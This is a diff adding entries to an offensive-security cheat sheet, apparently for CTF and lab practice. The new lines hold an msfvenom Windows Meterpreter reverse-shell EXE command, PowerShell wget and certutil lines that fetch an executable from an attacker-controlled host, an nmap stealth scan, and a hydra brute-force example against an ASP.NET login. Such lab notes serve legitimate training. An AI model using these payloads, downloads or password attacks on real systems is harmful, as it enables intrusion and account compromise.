@@ -12,7 +12,9 @@
     - [Web/HTTP](#webhttp)
 - [Reverse Shells](#reverse-shells)
   - [Bash Reverse Shell](#bash-reverse-shell)
+  - [Python Reverse Shell (Base64 Encoded)](#python-reverse-shell-base64-encoded)
   - [Msfvenom JSP WAR Reverse Shell](#msfvenom-jsp-war-reverse-shell)
+  - [Windows Meterpreter EXE Payload](#windows-meterpreter-exe-payload)
 - [Remote Access](#remote-access)
   - [Windows Remote Management (WinRM)](#windows-remote-management-winrm)
   - [Meterpreter Session Basics](#meterpreter-session-basics)
@@ -53,6 +55,15 @@ nmap -sS <target>
 * Fast and relatively stealthy (doesn't complete TCP connections)
 * Requires root/administrator privileges to craft raw packets
 * Most common scan type for initial reconnaissance
+
+* **SYN Scan Without Host Discovery** - Useful when ICMP/ping is blocked but host is known/alive
+
+```bash
+nmap -sS -T4 -Pn <target>
+```
+
+* `-Pn`: Treats all hosts as online (skips host discovery/ping phase)
+* `-T4`: Faster timing template for CTF/lab environments
 
 * **TCP Connect Scan** - Completes full TCP handshake, works without root privileges
 
@@ -486,6 +497,18 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o reverse
 * `-o reverse.war`: Output filename
 * Start a listener before the app runs the payload (e.g. `nc -lvnp <PORT>`), then deploy or trigger the WAR as the scenario allows
 
+### Windows Meterpreter EXE Payload
+
+* **Generate Windows reverse shell executable** - Common for post-exploitation when code execution is already available
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f exe -o reverse.exe
+```
+
+* `windows/meterpreter/reverse_tcp`: Staged Meterpreter payload for Windows
+* `-f exe`: Outputs a Windows executable
+* Use with a matching Metasploit handler (`exploit/multi/handler`)
+
 ---
 
 ## Remote Access
@@ -542,6 +565,13 @@ shell
 ```text
 load powershell
 powershell_shell
+```
+
+* **Download file from attacker web server (Windows target)**:
+
+```powershell
+powershell -c "wget http://<YOUR_IP>/reverse.exe -outfile reverse.exe"
+certutil -urlcache -f http://<YOUR_IP>/payload.exe payload.exe
 ```
 
 * **Leaving nested shells** - Type `exit` to leave `powershell_shell` or `shell` and return to the `meterpreter >` prompt
@@ -899,3 +929,4 @@ hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.82.136.134:10021
 * **Example with username list**: `hydra -L users.txt -P passwords.txt ftp://target`
 * **Example with SSH**: `hydra -l root -P rockyou.txt ssh://target`
 * **Example with HTTP POST**: `hydra -l admin -P rockyou.txt http-post-form://target/login.php:username=^USER^&password=^PASS^:F=incorrect`
+* **Example with ASP.NET login form**: `hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt <target> http-post-form "/Account/login.aspx:<POST_BODY_WITH_^PASS^>:Login failed"`
